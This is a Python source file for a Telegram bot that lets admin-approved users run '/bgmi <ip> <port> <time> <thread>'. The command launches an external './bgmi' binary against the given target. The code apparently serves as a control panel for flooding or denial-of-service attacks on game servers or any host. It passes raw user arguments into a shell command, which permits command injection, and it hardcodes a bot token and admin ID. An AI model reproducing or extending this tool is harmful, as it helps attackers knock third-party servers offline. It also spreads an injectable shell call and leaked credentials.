import os
import json
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7194542599:AAGn0a64pR-UTbrTb5udPrHJc25Lb2TKBac'  # Replace with your bot token
ADMIN_ID = 6479495033  # Replace with your admin user ID
APPROVED_USERS_FILE = 'approved_users.json'
BINARY_FILE_PATH = './bgmi'  # Path to the external binary file

# Load approved users from a file
def load_approved_users():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, 'r') as f:
            return set(json.load(f))
    return set()

# Save approved users to a file
def save_approved_users(approved_users):
    with open(APPROVED_USERS_FILE, 'w') as f:
        json.dump(list(approved_users), f)

approved_users = load_approved_users()  # Load approved user IDs at startup

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome! 🔥*\n\n"
        "*Use /bgmi <ip> <port> <time> <thread>*\n"
        "*For authorized users only.*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_bgmi_command(ip, port, time, thread):
    try:
        # Construct the command to execute the binary file
        command = f"{BINARY_FILE_PATH} {ip} {port} {time} {thread}"
        await asyncio.create_subprocess_shell(command)
    except Exception as e:
        print(f"Error while running bgmi command: {e}")

async def bgmi(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is allowed to use the bot
    if user_id not in approved_users:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    # Check if the correct number of parameters are provided
    args = context.args
    if len(args) != 4:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /bgmi <ip> <port> <time> <thread>*", parse_mode='Markdown')
        return

    ip, port, time, thread = args
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ BGMI Command Sent! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {time} seconds*\n"
        f"*🔧 Threads: {thread}*\n"
        f"*🔥 Executing...*"
    ), parse_mode='Markdown')

    # Run the command asynchronously
    asyncio.create_task(run_bgmi_command(ip, port, time, thread))

async def approve_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to approve users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /approve <user_id>*", parse_mode='Markdown')
        return

    approved_users.add(int(context.args[0]))
    save_approved_users(approved_users)  # Save changes to file
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {context.args[0]} has been approved.*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    approved_users.discard(int(context.args[0]))
    save_approved_users(approved_users)  # Save changes to file
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {context.args[0]} has been removed.*", parse_mode='Markdown')

async def error_handler(update: Update, context: CallbackContext):
    print(f"Update {update} caused error {context.error}")
    if update:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ An error occurred. Please try again later.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(CommandHandler("remove", remove_user))
    
    # Add error handler
    application.add_error_handler(error_handler)

    application.run_polling()

if __name__ == '__main__':
    main()
